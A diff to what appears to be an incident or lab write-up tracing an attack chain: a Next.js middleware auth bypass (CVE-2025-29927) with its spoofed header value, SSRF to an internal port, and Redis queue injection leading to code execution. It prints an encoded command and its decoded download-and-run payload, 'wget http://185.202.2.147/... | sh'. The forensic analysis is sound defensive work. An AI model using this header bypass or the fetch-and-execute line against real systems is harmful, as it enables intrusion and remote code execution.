@@ -62,7 +62,7 @@ Strong indicator of **auth bypass via CVE-2025-29927**
 ### 3. Exploitation (Middleware Bypass)
 
 - Requests include:
-  - `x-middleware-subrequest` header
+  - `["x-middleware-subrequest","middleware:middleware:middleware:middleware"]` header
 - Observed in interface logs
 
 This header manipulation allowed the attacker to:
@@ -73,8 +73,7 @@ This header manipulation allowed the attacker to:
 ### 4. SSRF + Internal Discovery (11:38:52)
 
 - Vulnerability chained with **SSRF**
-- Internal API discovered on:
-  - `localhost:4000`
+- Internal API discovered on port `4000`
 
 Attacker begins probing internal endpoints.
 
@@ -97,9 +96,9 @@ Significant information disclosure
 
 ### 6. Redis Injection -> RCE (11:39:26)
 
-- Attacker crafts malicious command using gathered data
+- Attacker crafts a malicious command using the previously gathered data
 - Injects into Redis queue
 
-Command: `OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb`
+redis.log Command: `OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb`
 
-Decoded payload: `wget http://185.202.2.147/h4Pln4/run.sh -O- | sh`
+Decoded payload visible in bci-device.log: `wget http://185.202.2.147/h4Pln4/run.sh -O- | sh`
